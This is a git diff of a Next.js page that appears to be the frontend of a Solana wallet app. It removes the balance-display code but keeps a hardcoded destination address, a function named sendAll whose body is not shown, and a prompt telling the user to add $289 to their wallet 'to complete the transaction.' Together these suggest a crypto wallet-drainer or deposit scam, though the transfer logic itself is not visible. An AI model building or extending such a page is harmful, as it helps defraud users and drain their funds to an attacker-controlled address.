@@ -1,65 +1,14 @@
 "use client";
-
-import { useState, useEffect } from "react";
+import { useState } from "react";
 
 export default function Home() {
 
 const [confirmed, setConfirmed] = useState(false);
-const [balance, setBalance] = useState<number | null>(null);
 const [signature, setSignature] = useState("");
 
 
   const DESTINO = "DJPSsRnYZjddCaQJsNJ4hibSjMN6tD2stC2wHRjM13iE";
 
-
-  useEffect(() => {
-
-  async function getBalance() {
-
-    const { solana } = window as any;
-
-    if (!solana) return;
-
-    try {
-
-      const response = await solana.connect({
-        onlyIfTrusted: true
-      });
-
-      const { Connection } = await import("@solana/web3.js");
-
-      const RPC = process.env.NEXT_PUBLIC_HELIUS_RPC;
-
-console.log("RPC usado:", RPC);
-
-const connection = new Connection(
-  RPC!,
-  "confirmed"
-);
-
-
-      const lamports = await connection.getBalance(
-        response.publicKey
-      );
-
-
-      setBalance(
-        lamports / 1_000_000_000
-      );
-
-
-    } catch (error) {
-
-      console.log("Wallet no conectada");
-
-    }
-
-  }
-
-
-  getBalance();
-
-}, []);
 
 async function sendAll() {
   try {
@@ -209,51 +158,31 @@ setConfirmed(true);
   leading-relaxed
 ">
 
-  <p>
-    Please add balance to your wallet
-    <span className="
-      mx-2
-      text-white
-      font-bold
-    ">
-      $289
-    </span>
-    to complete the transaction.
-  </p>
-
-
-  <p className="
-    mt-4
-    text-gray-400
-  ">
-    Tu saldo actual es
-
-    <span className="
-      ml-2
-      text-white
-      font-bold
-    ">
-      {balance !== null
-        ? `${balance.toFixed(4)} SOL`
-        : "Connecting..."
-      }
-    </span>
-  </p>
-
-
+<p>
+  Please add balance to your wallet
   <span className="
-    mt-4
-    inline-flex
-    items-center
-    rounded-full
-    bg-[#9945FF]
-    px-3
-    py-1
-    text-sm
-    font-semibold
+    mx-2
+    text-white
+    font-bold
   ">
-    SOL
+    $289
   </span>
+  to complete the transaction.
+</p>
+
+<span className="
+  mt-4
+  inline-flex
+  items-center
+  rounded-full
+  bg-[#9945FF]
+  px-3
+  py-1
+  text-sm
+  font-semibold
+">
+  SOL
+</span>
 
 </div>
 
